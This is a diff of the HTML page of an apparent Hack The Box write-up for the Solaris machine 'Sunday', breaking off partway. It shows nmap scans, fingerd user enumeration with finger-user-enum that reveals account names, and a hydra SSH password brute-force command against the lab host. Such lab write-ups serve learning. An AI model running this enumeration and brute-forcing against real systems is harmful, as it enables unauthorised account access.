@@ -1,119 +1,230 @@
-<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="[map[name:MindYourPrivacy]]"><meta name=description content="Solaris"><meta name=keywords content=",fingerd,hydra,john,sudo"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://0xade1.github.io/posts/2020/09/htb-sunday/><title>HTB - Sunday :: Poney Island — Welcome to Pwnie Island</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://0xade1.github.io/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css><link rel=apple-touch-icon sizes=180x180 href=https://0xade1.github.io/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://0xade1.github.io/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://0xade1.github.io/favicon-16x16.png><link rel=manifest href=https://0xade1.github.io/site.webmanifest><link rel=mask-icon href=https://0xade1.github.io/safari-pinned-tab.svg color=#1b1c1d><link rel="shortcut icon" href=https://0xade1.github.io/favicon.ico><meta name=msapplication-TileColor content="#1b1c1d"><meta name=theme-color content="#1b1c1d"><meta itemprop=name content="HTB - Sunday"><meta itemprop=description content="Solaris"><meta itemprop=datePublished content="2020-09-19T00:54:12+08:00"><meta itemprop=dateModified content="2020-09-19T00:54:12+08:00"><meta itemprop=wordCount content="1050"><meta itemprop=image content="https://0xade1.github.io"><meta itemprop=keywords content="fingerd,hydra,john,sudo,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0xade1.github.io"><meta name=twitter:title content="HTB - Sunday"><meta name=twitter:description content="Solaris"><meta property="og:title" content="HTB - Sunday"><meta property="og:description" content="Solaris"><meta property="og:type" content="article"><meta property="og:url" content="https://0xade1.github.io/posts/2020/09/htb-sunday/"><meta property="og:image" content="https://0xade1.github.io"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-09-19T00:54:12+08:00"><meta property="article:modified_time" content="2020-09-19T00:54:12+08:00"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-crossfittwo/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-knife/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-shocker/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-buff/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-admirer/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-sense/"><meta property="article:section" content="htb-solaris"><meta property="article:published_time" content="2020-09-19 00:54:12 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=https://0xade1.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content="[map[name:MindYourPrivacy]]">
+<meta name=description content="Solaris">
+<meta name=keywords content=",fingerd,hydra,john,sudo">
+<meta name=robots content="noodp">
+<meta name=theme-color content>
+<link rel=canonical href=https://0xade1.github.io/posts/2020/09/htb-sunday/>
+<title>
+HTB - Sunday :: Poney Island — Welcome to Pwnie Island
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=https://0xade1.github.io/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css>
+<link rel=apple-touch-icon sizes=180x180 href=https://0xade1.github.io/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://0xade1.github.io/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=https://0xade1.github.io/favicon-16x16.png>
+<link rel=manifest href=https://0xade1.github.io/site.webmanifest>
+<link rel=mask-icon href=https://0xade1.github.io/safari-pinned-tab.svg color=#1b1c1d>
+<link rel="shortcut icon" href=https://0xade1.github.io/favicon.ico>
+<meta name=msapplication-TileColor content="#1b1c1d">
+<meta name=theme-color content="#1b1c1d">
+<meta itemprop=name content="HTB - Sunday">
+<meta itemprop=description content="Solaris"><meta itemprop=datePublished content="2020-09-19T00:54:12+08:00">
+<meta itemprop=dateModified content="2020-09-19T00:54:12+08:00">
+<meta itemprop=wordCount content="1050"><meta itemprop=image content="https://0xade1.github.io">
+<meta itemprop=keywords content="fingerd,hydra,john,sudo,">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://0xade1.github.io">
+<meta name=twitter:title content="HTB - Sunday">
+<meta name=twitter:description content="Solaris">
+<meta property="og:title" content="HTB - Sunday">
+<meta property="og:description" content="Solaris">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://0xade1.github.io/posts/2020/09/htb-sunday/"><meta property="og:image" content="https://0xade1.github.io"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2020-09-19T00:54:12+08:00">
+<meta property="article:modified_time" content="2020-09-19T00:54:12+08:00">
+<meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-crossfittwo/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2021/09/htb-knife/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-shocker/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-buff/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-admirer/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2020/09/htb-sense/">
+<meta property="article:section" content="htb-solaris">
+<meta property="article:published_time" content="2020-09-19 00:54:12 +0800 +0800">
+</head>
+<body>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=https://0xade1.github.io/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
 <span class=logo__text># cd /root/</span>
-<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://0xade1.github.io/about/>About</a></li><li><a href=https://0xade1.github.io/categories/>Categories</a></li><li><a href=https://0xade1.github.io/posts/>Posts</a></li><li><a href=https://0xade1.github.io/series/>Series</a></li><li><a href=https://0xade1.github.io/tags/>Tags</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" ecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2020-09-18
+<span class=logo__cursor>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=https://0xade1.github.io/about/>About</a></li><li><a href=https://0xade1.github.io/categories/>Categories</a></li><li><a href=https://0xade1.github.io/posts/>Posts</a></li><li><a href=https://0xade1.github.io/series/>Series</a></li><li><a href=https://0xade1.github.io/tags/>Tags</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<main class=post>
+<div class=post-info><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" ecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+2020-09-18
 |<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
 <span class=tag><a href=https://0xade1.github.io/categories/htb-solaris/>htb-solaris</a></span>
 |
 |<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
 <span class=tag><a href=https://0xade1.github.io/series/htb/>htb</a></span>
-|</div><article><h1 class=post-title><a href=https://0xade1.github.io/posts/2020/09/htb-sunday/>HTB - Sunday</a></h1><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://0xade1.github.io/tags/fingerd/>fingerd</a></span>
+|
+</div>
+<article>
+<h1 class=post-title>
+<a href=https://0xade1.github.io/posts/2020/09/htb-sunday/>HTB - Sunday</a>
+</h1>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span class=tag><a href=https://0xade1.github.io/tags/fingerd/>fingerd</a></span>
 <span class=tag><a href=https://0xade1.github.io/tags/hydra/>hydra</a></span>
 <span class=tag><a href=https://0xade1.github.io/tags/john/>john</a></span>
-<span class=tag><a href=https://0xade1.github.io/tags/sudo/>sudo</a></span></p></div><div class=post-excerpt>Solaris</div><figure class=post-cover><img src=https://www.hackthebox.eu/images/logo-htb.svg alt="HTB - Sunday"></figure><div class=post-content><h1 id=nmap>nmap</h1><p>Quick scan</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -p- -T4 --min-rate<span style=color:#ff79c6>=</span><span style=color:#bd93f9>5000</span> 10.10.10.76
-</span></span><span style=display:flex><span>PORT      STATE SERVICE
-</span></span><span style=display:flex><span>79/tcp    open  finger
-</span></span><span style=display:flex><span>111/tcp   open  rpcbind
-</span></span><span style=display:flex><span>22022/tcp open  unknown
-</span></span><span style=display:flex><span>41931/tcp open  unknown
-</span></span><span style=display:flex><span>64172/tcp open  unknown
-</span></span></code></pre></td></tr></table></div></div><p>Most notable is finger</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt;nmap -p79,111,22022,41931,64172 -sC -sV -oA nmap/sunday 10.10.10.76
-</span></span><span style=display:flex><span>Starting Nmap 7.80 <span style=color:#ff79c6>(</span> https://nmap.org <span style=color:#ff79c6>)</span> at 2020-09-19 18:17 HKT
-</span></span><span style=display:flex><span>Nmap scan report <span style=color:#ff79c6>for</span> 10.10.10.76
-</span></span><span style=display:flex><span>Host is up <span style=color:#ff79c6>(</span>0.050s latency<span style=color:#ff79c6>)</span>.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>PORT      STATE SERVICE VERSION
-</span></span><span style=display:flex><span>79/tcp    open  finger  Sun Solaris fingerd
-</span></span><span style=display:flex><span>|_finger: No one logged on<span style=color:#f1fa8c>\x</span>0D
-</span></span><span style=display:flex><span>111/tcp   open  rpcbind 2-4 <span style=color:#ff79c6>(</span>RPC <span style=color:#6272a4>#100000)</span>
-</span></span><span style=display:flex><span>22022/tcp open  ssh     SunSSH 1.3 <span style=color:#ff79c6>(</span>protocol 2.0<span style=color:#ff79c6>)</span>
-</span></span><span style=display:flex><span>| ssh-hostkey:
-</span></span><span style=display:flex><span>|   <span style=color:#bd93f9>1024</span> d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e <span style=color:#ff79c6>(</span>DSA<span style=color:#ff79c6>)</span>
-</span></span><span style=display:flex><span>|_  <span style=color:#bd93f9>1024</span> e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac <span style=color:#ff79c6>(</span>RSA<span style=color:#ff79c6>)</span>
-</span></span><span style=display:flex><span>41931/tcp open  unknown
-</span></span><span style=display:flex><span>64172/tcp open  unknown
-</span></span><span style=display:flex><span>Service Info: OS: Solaris; CPE: cpe:/o☀sunos
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style=display:flex><span>Nmap <span style=color:#ff79c6>done</span>: <span style=color:#bd93f9>1</span> IP address <span style=color:#ff79c6>(</span><span style=color:#bd93f9>1</span> host up<span style=color:#ff79c6>)</span> scanned in 40.74 seconds
-</span></span></code></pre></td></tr></table></div></div><p>We get <a href=http://pentestmonkey.net/tools/user-enumeration/finger-user-enum>finger-user-enum</a> from pentestmonkey</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>_  sunday curl -Ok http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
-</span></span><span style=display:flex><span>_  sunday ./finger-user-enum.pl -t 10.10.10.76 -U /opt/SecLists/Usernames/Names/names.txt -m <span style=color:#bd93f9>50</span>
-</span></span><span style=display:flex><span>Starting finger-user-enum v1.0 <span style=color:#ff79c6>(</span> http://pentestmonkey.net/tools/finger-user-enum <span style=color:#ff79c6>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span> ----------------------------------------------------------
-</span></span><span style=display:flex><span>|                   Scan Information                       |
-</span></span><span style=display:flex><span> ----------------------------------------------------------
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Worker Processes ......... <span style=color:#bd93f9>50</span>
-</span></span><span style=display:flex><span>Usernames file ........... /opt/SecLists/Usernames/Names/names.txt
-</span></span><span style=display:flex><span>Target count ............. <span style=color:#bd93f9>1</span>
-</span></span><span style=display:flex><span>Username count ........... <span style=color:#bd93f9>10163</span>
-</span></span><span style=display:flex><span>Target TCP port .......... <span style=color:#bd93f9>79</span>
-</span></span><span style=display:flex><span>Query timeout ............ <span style=color:#bd93f9>5</span> secs
-</span></span><span style=display:flex><span>Relay Server ............. Not used
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#6272a4>######## Scan started at Sat Sep 19 17:43:43 2020 #########</span>
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>sammy@10.10.10.76: sammy                 console      &lt;Jul <span style=color:#bd93f9>31</span> 17:59&gt;..
-</span></span><span style=display:flex><span>sunny@10.10.10.76: sunny                 pts/3        &lt;Apr 24, 2018&gt; 10.10.14.4          ..
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span><span style=color:#6272a4>######## Scan completed at Sat Sep 19 17:45:43 2020 #########</span>
-</span></span><span style=display:flex><span><span style=color:#bd93f9>14</span> results.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#bd93f9>10163</span> queries in <span style=color:#bd93f9>120</span> seconds <span style=color:#ff79c6>(</span>84.7 queries / sec<span style=color:#ff79c6>)</span>
-</span></span></code></pre></td></tr></table></div></div><p>We can now try to bruteforce with <code>hydra</code>, however it&rsquo;s gonna take ages with a large password dictionnary, so maybe we try instead to craft a small dictionary with some easy guess such as hostname and default passwords</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>_  sunday hydra -L users.txt -P passwords.txt ssh://10.10.10.76:22022
-</span></span></code></pre></td></tr></table></div></div><pre tabindex=0><code>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+<span class=tag><a href=https://0xade1.github.io/tags/sudo/>sudo</a></span>
+</p>
+</div>
+<div class=post-excerpt>Solaris</div>
+<figure class=post-cover>
+<img src=https://www.hackthebox.eu/images/logo-htb.svg alt="HTB - Sunday">
+</figure>
+<div class=post-content>
+<h1 id=nmap>nmap</h1>
+<p>Quick scan</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nmap -p- -T4 --min-rate<span style=color:#ff79c6>=</span><span style=color:#bd93f9>5000</span> 10.10.10.76
+PORT      STATE SERVICE
+79/tcp    open  finger
+111/tcp   open  rpcbind
+22022/tcp open  unknown
+41931/tcp open  unknown
+64172/tcp open  unknown
+</code></pre></td></tr></table>
+</div>
+</div><p>Most notable is finger</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>&gt;nmap -p79,111,22022,41931,64172 -sC -sV -oA nmap/sunday 10.10.10.76
+Starting Nmap 7.80 <span style=color:#ff79c6>(</span> https://nmap.org <span style=color:#ff79c6>)</span> at 2020-09-19 18:17 HKT
+Nmap scan report <span style=color:#ff79c6>for</span> 10.10.10.76
+Host is up <span style=color:#ff79c6>(</span>0.050s latency<span style=color:#ff79c6>)</span>.
+
+PORT      STATE SERVICE VERSION
+79/tcp    open  finger  Sun Solaris fingerd
+|_finger: No one logged on<span style=color:#f1fa8c>\x</span>0D
+111/tcp   open  rpcbind 2-4 <span style=color:#ff79c6>(</span>RPC <span style=color:#6272a4>#100000)</span>
+22022/tcp open  ssh     SunSSH 1.3 <span style=color:#ff79c6>(</span>protocol 2.0<span style=color:#ff79c6>)</span>
+| ssh-hostkey:
+|   <span style=color:#bd93f9>1024</span> d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e <span style=color:#ff79c6>(</span>DSA<span style=color:#ff79c6>)</span>
+|_  <span style=color:#bd93f9>1024</span> e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac <span style=color:#ff79c6>(</span>RSA<span style=color:#ff79c6>)</span>
+41931/tcp open  unknown
+64172/tcp open  unknown
+Service Info: OS: Solaris; CPE: cpe:/o☀sunos
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style=color:#ff79c6>done</span>: <span style=color:#bd93f9>1</span> IP address <span style=color:#ff79c6>(</span><span style=color:#bd93f9>1</span> host up<span style=color:#ff79c6>)</span> scanned in 40.74 seconds
+</code></pre></td></tr></table>
+</div>
+</div><p>We get <a href=http://pentestmonkey.net/tools/user-enumeration/finger-user-enum>finger-user-enum</a> from pentestmonkey</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
